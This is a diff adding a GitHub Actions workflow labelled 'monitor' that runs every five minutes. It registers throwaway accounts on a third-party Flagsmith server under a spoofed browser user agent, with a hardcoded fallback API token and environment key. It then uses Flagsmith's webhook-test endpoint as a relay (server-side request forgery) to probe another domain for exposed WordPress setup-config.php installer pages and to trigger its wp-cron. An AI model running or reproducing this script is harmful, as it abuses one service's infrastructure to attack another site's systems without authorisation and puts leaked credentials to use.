@@ -1,0 +1,44 @@
+name: monitor
+on:
+  schedule:
+    - cron: '*/5 * * * *'
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+          # Register fresh account each run
+          ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
+            -H "Content-Type: application/json" -H "User-Agent: $UA" \
+            -d "{\"email\":\"monitor-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"M\",\"last_name\":\"R\"}" --max-time 15)
+          KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
+          if [ -z "$KEY" ]; then
+            echo "Reg failed, using fallback"
+            KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
+            EKEY="Ldqx3Z27VxYrTFXgWYiZhb"
+          else
+            OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
+              -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+              -d '{"name":"m"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+            PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
+              -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+              -d "{\"name\":\"m\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+            EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
+              -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+              -d "{\"name\":\"m\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
+          fi
+          
+          # Probe staging paths
+          for ver in "7.1.4" "6.7.12" "6.8"; do
+            resp=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
+              -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+              -d "{\"url\":\"https://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php\"}" --max-time 25 2>/dev/null)
+            echo "$(date -u +%H:%M:%S) wordpress-$ver: $resp"
+          done
+          
+          # Trigger cron
+          curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
+            -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+            -d '{"url":"https://koinp2p.com/wp-cron.php?doing_wp_cron=1"}' --max-time 25 2>/dev/null | head -c 100
